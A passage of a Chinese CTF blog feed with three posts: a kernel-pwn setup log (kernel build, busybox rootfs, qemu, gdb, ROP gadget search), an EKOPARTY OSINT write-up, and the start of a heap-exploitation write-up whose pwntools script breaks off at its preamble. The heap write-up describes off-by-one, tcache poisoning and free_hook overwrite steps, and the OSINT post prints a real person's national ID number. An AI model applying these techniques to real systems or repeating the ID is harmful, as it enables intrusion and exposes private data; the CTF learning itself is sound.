    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>打算开始学linux kernel pwn，主要跟着这位大师傅学，多处引原文见谅🙈，做些学习记录</p><p><a href="https://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/">【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3’s blog</a></p><h2 id="0x01获取内核镜像">0x01获取内核镜像</h2><p>根据上述文档，我选择自行编译内核源码，去下了个linux-5.11的内核镜像</p><p>总而言之报了很多错，</p><p>最先遇到的问题就是虚拟机硬盘内存，虚拟内存，我自己划的太小，一次编译内核就没内存了，费不少时间，结果最后报个错，寄。然后我去重新整了一个ubuntu20.04，这次划了50g硬盘，3g虚拟内存（不过free -m看过来好像swap区域还是2g）</p><p>还有一些就是配置，依赖的问题，报啥错安装啥就行</p><p>最后成功搞定</p><p><img src="/2022/11/04/0x01kernel%E5%AD%A6%E4%B9%A0/kernel1.png" alt="kernel1"></p><p>关注两个文件</p><p><strong>vmlinux：原始内核文件</strong></p><p>在当前目录下</p><p><strong>bzImage：压缩内核镜像</strong></p><p>在当前目录下的<code>arch/x86/boot/</code>目录下</p><p>由于是我们自己编译的，可以自己魔改内核</p><h2 id="0x02busybox构建文件系统">0x02busybox构建文件系统</h2><h3 id="1-编译busybox">1.编译busybox</h3><p>勾选静态链接</p><blockquote><p>勾选Settings —&gt; Build static binary file (no shared lib)</p></blockquote><h3 id="2-建立文件系统">2.建立文件系统</h3><p>加一些目录文件，创建了初始化文件init.d</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd _install<br>mkdir -pv &#123;bin,sbin,etc,proc,sys,home,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;<br>touch etc/inittab<br>mkdir etc/init.d<br>touch etc/init.d/rcS<br>chmod +x ./etc/init.d/rcS<br></code></pre></td></tr></table></figure><p>指定了系统初始化脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">::sysinit:/etc/init.d/rcS<br>::askfirst:/bin/ash<br>::ctrlaltdel:/sbin/reboot<br>::shutdown:/sbin/swapoff -a<br>::shutdown:/bin/umount -a -r<br>::restart:/sbin/init<br></code></pre></td></tr></table></figure><p>配置我们前面创的目录的挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>mount -t proc none /proc<br>mount -t sys none /sys<br>/bin/mount -n -t sysfs none /sys<br>/bin/mount -t ramfs none /dev<br>/sbin/mdev -s<br></code></pre></td></tr></table></figure><h3 id="3-配置用户组">3.配置用户组</h3><p>用户组ctf和root</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;root:x:0:0:root:/root:/bin/sh&quot; &gt; etc/passwd<br>echo &quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot; &gt;&gt; etc/passwd<br>echo &quot;root:x:0:&quot; &gt; etc/group<br>echo &quot;ctf:x:1000:&quot; &gt;&gt; etc/group<br>echo &quot;none /dev/pts devpts gid=5,mode=620 0 0&quot; &gt; etc/fstab<br></code></pre></td></tr></table></figure><h3 id="4-打包文件系统">4.打包文件系统</h3><p>打包为rootfs.cpio</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">find . | cpio -o --<span class="hljs-built_in">format</span>=newc &gt; ../../rootfs.cpio<br></code></pre></td></tr></table></figure><p>后续要加文件可以解压，放文件后再打包</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-meta">#解压</span><br>cpio -idv &lt; ./rootfs.cpio<br><span class="hljs-meta">#打包</span><br>find . | cpio -o --format=<span class="hljs-keyword">new</span><span class="hljs-type">c</span> &gt; ../<span class="hljs-keyword">new</span><span class="hljs-type">_rootfs</span>.cpio<br></code></pre></td></tr></table></figure><h2 id="0x03qemu运行内核">0x03qemu运行内核</h2><p>我们把bzImage和rootfs.cpio拷贝到另一文件夹</p><p>写启动脚本<code>touch boot.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">\#!/bin/sh<br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd  ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append &quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr&quot; \<br>    -cpu kvm64,+smep \<br>    -smp cores=2,threads=1 \<br>    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>    -nographic \<br>    -s<br></code></pre></td></tr></table></figure><p>这边直接引原文了：</p><ul><li><code>-m</code>：虚拟机内存大小</li><li><code>-kernel</code>：内存镜像路径</li><li><code>-initrd</code>：磁盘镜像路径</li><li><code>-append</code>：附加参数选项<ul><li><code>nokalsr</code>：关闭内核地址随机化，方便我们进行调试</li><li><code>rdinit</code>：指定初始启动进程，<code>/sbin/init</code>进程会默认以<code>/etc/init.d/rcS</code>作为启动脚本</li><li><code>loglevel=3 </code>&amp; <code>quiet</code>：不输出log</li><li><code>console=ttyS0</code>：指定终端为<code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li></ul></li><li><code>-monitor</code>：将监视器重定向到主机设备<code>/dev/null</code>，这里重定向至null主要是防止CTF中被人给偷了qemu拿flag</li><li><code>-cpu</code>：设置CPU安全选项，在这里开启了smep保护</li><li><code>-s</code>：相当于<code>-gdb tcp::1234</code>的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试</li></ul><p>然后运行<code>./boot.sh</code>，成功</p><p><img src="/2022/11/04/0x01kernel%E5%AD%A6%E4%B9%A0/kernel2.png" alt="kernel2"></p><h2 id="0x04-编写可装载内核模块（LKMs）">0x04.编写可装载内核模块（LKMs）</h2><h3 id="1-一个测试模块">1.一个测试模块</h3><p>创建<code>hellokernel.c</code>文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">kernel_module_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(<span class="hljs-string">&quot;&lt;1&gt;Welcome,this is just a test!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">kernel_module_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(<span class="hljs-string">&quot;&lt;1&gt;Good bye,see you again!\n&quot;</span>);<br>&#125;<br>module_init(kernel_module_init);<br>module_exit(kernel_module_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;nqoinaen&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="头文件">头文件</h4><ul><li><code>linux/module.h</code>：对于LKM而言这是必须包含的一个头文件</li><li><code>linux/kernel.h</code>：载入内核相关信息</li><li><code>linux/init.h</code>：包含着一些有用的宏</li></ul><p>通常情况下，这三个头文件对于内核模块编程都是不可或缺的</p><h4 id="入口点-出口点">入口点/出口点</h4><p>一个内核模块的入口点应当为<code> module_init()</code>，出口函数应当为<code>module_exit()</code>，在内核载入/卸载内核模块时会缺省调用这两个函数</p><p>我们把我们写的函数指针放入，作为出入函数</p><h4 id="其他">其他</h4><ul><li><code>__init &amp; __exit</code>：这两个宏用以在函数结束后释放相应的内存</li><li><code>MODULE_AUTHOR() &amp; MODULE_LICENSE()</code>：声明内核作者与发行所用许可证</li><li><code>printk()</code>：内核态函数，用以在内核缓冲区写入信息，其中<code>&lt;1&gt;</code>标识着信息的紧急级别（一共有8个优先级，0为最高，相关宏定义于linux/kernel.h中）</li></ul><h3 id="2-Makefile编译模块">2.Makefile编译模块</h3><p>创建<code>Makefile</code>文件，写入</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-m += hellokernel.o<br>CURRENT_PATH := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>LINUX_KERNEL := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span><br>LINUX_KERNEL_PATH := /usr/src/linux-headers-<span class="hljs-variable">$(LINUX_KERNEL)</span><br><span class="hljs-section">all:</span><br>    make -C <span class="hljs-variable">$(LINUX_KERNEL_PATH)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> modules<br><span class="hljs-section">clean:</span><br>    make -C <span class="hljs-variable">$(LINUX_KERNEL_PATH)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> clean<br></code></pre></td></tr></table></figure><p>使用命令<code>make</code>编译</p><p>再运行一下这个模块</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo <span class="hljs-keyword">insmod </span>hellokernel.ko<br><br>sudo rmmod hellokernel<br></code></pre></td></tr></table></figure><p><code>dmesg</code>查看信息</p><p>可以看到成功了</p><p><img src="/2022/11/04/0x01kernel%E5%AD%A6%E4%B9%A0/kernel4.png" alt="kernel4"></p><h3 id="3-提供应用程式I-O接口">3.提供应用程式I/O接口</h3><p>…后面就不试了</p><h2 id="0x05用-qemu-gdb-调试Linux内核">0x05用 qemu + gdb 调试Linux内核</h2><h3 id="1-载入内核符号表">1.载入内核符号表</h3><p>在源码跟目录用 gdb 载入未压缩的内核镜像 vmlinux</p><p>记得加sudo不然权限不足</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo gdb vmlinux</span><br></code></pre></td></tr></table></figure><h3 id="2-remote连接">2.remote连接</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">pwndbg&gt; <span class="hljs-keyword">set</span> architecture <span class="hljs-comment">i386:x86-64</span><br>pwndbg&gt; target <span class="hljs-comment">remote localhost:1234</span><br></code></pre></td></tr></table></figure><p><img src="/2022/11/04/0x01kernel%E5%AD%A6%E4%B9%A0/kernel3.png" alt="kernel3"></p><h3 id="3-解压-bzImage-镜像">3.解压 bzImage 镜像</h3><p>一些 CTF 题目只给压缩后的内核镜像<code>bzImage</code></p><p>创建文件<code>extract-vmlinux</code></p><p>写入如下代码，注意给它权限<code>chmod +777 extract-vmlinux</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># Inspired from extract-ikconfig</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># ----------------------------------------------------------------------</span></span><br>check_vmlinux()<br>&#123;<br>    # Use readelf to check if it&#x27;s a valid ELF<br>    # TODO: find a better to way to check that it&#x27;s really vmlinux<br>    #       and not just an elf<br>    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1<br><br>    cat $1<br>    exit 0<br>&#125;<br><br>try_decompress()<br>&#123;<br>    # The obscure use of the &quot;tr&quot; filter is to work around older versions of<br>    # &quot;grep&quot; that report the byte offset of the line instead of the pattern.<br><br>    # Try to find the header ($1) and decompress from here<br>    for    pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`<br>    do<br>        pos=$&#123;pos%%:*&#125;<br>        tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null<br>        check_vmlinux $tmp<br>    done<br>&#125;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Check invocation:</span><br>me=$&#123;0##*/&#125;<br>img=$1<br>if    [ $# -ne 1 -o ! -s &quot;$img&quot; ]<br>then<br>    echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2<br>    exit 2<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Prepare temp files:</span><br>tmp=$(mktemp /tmp/vmlinux-XXX)<br>trap &quot;rm -f $tmp&quot; 0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">That didn<span class="hljs-string">&#x27;t work, so retry after decompression.</span></span><br>try_decompress &#x27;\037\213\010&#x27; xy    gunzip<br>try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz<br>try_decompress &#x27;BZh&#x27;          xy    bunzip2<br>try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma<br>try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;<br>try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;<br>try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Finally check for uncompressed images or objects:</span></span><br>check_vmlinux $img<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Bail out:</span></span><br>echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2<br><br></code></pre></td></tr></table></figure><p>用法如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo ./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h3 id="4-找gadget">4.找gadget</h3><p>用ROPgadget或者ropper都行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ./vmlinux &gt; gadget.txt<br>ropper --file ./vmlinux --nocolor &gt; gadget2.txt<br></code></pre></td></tr></table></figure><p>亦可以pwntools暴力搜</p><p>如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">pop_rdi</span> = <span class="hljs-variable">libc_base</span> + <span class="hljs-function"><span class="hljs-title">next</span>(<span class="hljs-variable">libc.search</span>(<span class="hljs-title">asm</span>(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))</span><br></code></pre></td></tr></table></figure><h3 id="5、调试内核模块">5、调试内核模块</h3><p>…略略略，后面的用到再学吧😵</p><p>先去找道题练练手</p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF EKOPARTY 2022</title>
    <link href="/2022/11/03/CTFEKOPARTY2022/"/>
    <url>/2022/11/03/CTFEKOPARTY2022/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>好像没有pwn，随便找其他题型玩玩，但感觉学不到什么东西</p><p>（提前放了，不过也没人会看吧，多图警告）</p><h2 id="Square">Square</h2><blockquote><p>While the photographer was enjoying a delicious cup of coffee in the main square of a Colombian city, he manages to turn on his camera and take a photo at sunset. Days later, he wanted to remember the name of the monument that is in the center of the square, but he did not remember it.</p><p>Could you help the photographer to identify the name of the monument’s person?</p></blockquote><p>当摄影师在哥伦比亚城市的主要广场上享用一杯美味的咖啡时，他设法打开相机并在日落时分拍照。几天后，他想记住广场中心的纪念碑的名字，但他不记得了。 你能帮摄影师辨认出纪念碑的人名吗？</p><p>给出一张图片，找名字</p><p><img src="/2022/11/03/CTFEKOPARTY2022/square.png" alt="square"></p><p>那我就谷歌地图上找哥伦比亚的城市</p><p>然后我找着发现帕斯托这城市介绍的某张图就是这位置</p><p><img src="/2022/11/03/CTFEKOPARTY2022/psk.png" alt="psk"></p><p>发现是在Plaza de Nariño公园</p><p>然后谷歌全景地图跟进</p><p><img src="/2022/11/03/CTFEKOPARTY2022/psk3-1667454225725.png" alt="psk3"></p><p>发现是这个伟人</p><p><img src="/2022/11/03/CTFEKOPARTY2022/psk4-1667454243055.png" alt="psk4"></p><p>所以flag是</p><p>EKO{antonio_nariño}</p><p><img src="/2022/11/03/CTFEKOPARTY2022/psk5.png" alt="psk5"></p><h2 id="Yankee">Yankee</h2><blockquote><p>In October, a scandal broke out in Peru because fake tickets were sold for the concert of Daddy Yankee, who is a reggaeton singer announcing his latest concert tour.<br>According to reliable sources in Peru, the cybercriminal group that created this portal and collected the money was under the command of an 18-year-old person. Could you help identify this person by her Documento Nacional de Identidad (DNI)?</p></blockquote><p>10月，秘鲁爆发了丑闻，因为爸爸洋基的音乐会出售了假票，洋基爸爸是一名雷鬼歌手，宣布了他的最新巡回演唱会。 根据秘鲁的可靠消息来源，创建该门户网站并收取资金的网络犯罪集团是在一名 18 岁的人指挥下进行的。你能通过她的国家身份文件（DNI）帮助识别这个人吗？</p><p>我还以为要用什么不正常途径搞来，结果google一下</p><p>她自己把DNI写出来了233</p><p><img src="/2022/11/03/CTFEKOPARTY2022/dni.png" alt="dni"></p><p>flag：EKO{72266384}</p><p><img src="/2022/11/03/CTFEKOPARTY2022/yankee-1667457113039.png" alt="yankee"></p><h2 id="Bounties">Bounties</h2><blockquote><p>A few decades ago, a book writer found a way to improve the quality of his books, giving away a check with a value of $2.56 to anyone who will be able to identify and report bugs in his master piece, are you able to identify this guy?</p></blockquote><p>几十年前，一位作家找到了一种提高书籍质量的方法，将一张价值 2.56 美元的支票赠送给任何能够识别和报告其杰作中的错误的人，你能识别这个人吗？</p><p>一搜就有</p><p><img src="/2022/11/03/CTFEKOPARTY2022/bount.png" alt="bount"></p><p>flag：EKO{donald_knuth}</p><p><img src="/2022/11/03/CTFEKOPARTY2022/bount1.png" alt="bount1"></p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ctf比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022第三届祥云杯网络安全大赛pwn</title>
    <link href="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/"/>
    <url>/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>就做出了两道pwn，分别为bitheap和unexploitable，也是比赛中解出人数最多的两道pwn。（卡在sandboxheap那个沙盒了，没看懂ban了啥）先放这两道题目，后续复现了其他题目再上传。</p><p>比赛三十名附近竞争太激烈了，最后一分钟刷新一次排名就变一次，做过山车😱，说到底还是自己太菜，拖后腿</p><h2 id="bitheap">bitheap</h2><p>这题与sandboxheap是同一道题，只是后者多加了个沙盒保护。但是这题是在sandboxheap后面放出来的…</p><h3 id="0x01程序分析">0x01程序分析</h3><p>libc版本Ubuntu GLIBC 2.27-3ubuntu1.6，这次比赛几乎都是2.27的</p><p>保护全开</p><p>程序存在off by one</p><p><img src="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/bitheapbug.png" alt="bitheapbug"></p><p>然后同样在edit功能里有个函数，有一个对每个字节逆序的操作</p><blockquote><p>例：如果我们要输入0x02</p><p>就要输入字符串  <code>’01000000‘</code>,它是<code>‘00000010’</code>的逆序</p></blockquote><p>我们要写个函数处理下它的转换</p><p>然后其他功能都齐全了</p><h3 id="0x02利用思路">0x02利用思路</h3><p>这题的解法和去年的[PassWordBox_FreeVersion](<a href="https://blog.csdn.net/m0_51251108/article/details/127452277?spm=1001.2014.3001.5501">2021 祥云杯PassWordBox_FreeVersion_Nqoinaen的博客-CSDN博客</a>)很像</p><p>我们就用off by null，通过堆风水使unsortbin向上合并，造成堆块重叠，使两个堆申请到同一块地址，顺便泄露了libc,heap的地址</p><p>接着我们造成tcache poisoning ，我们可以指向free_hook，可以改free_hook为setcontext+53,写入orw</p><p>亦可以直接改free_hook为system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./bitheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;101.201.71.136&#x27;</span>, <span class="hljs-number">23712</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims          :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span 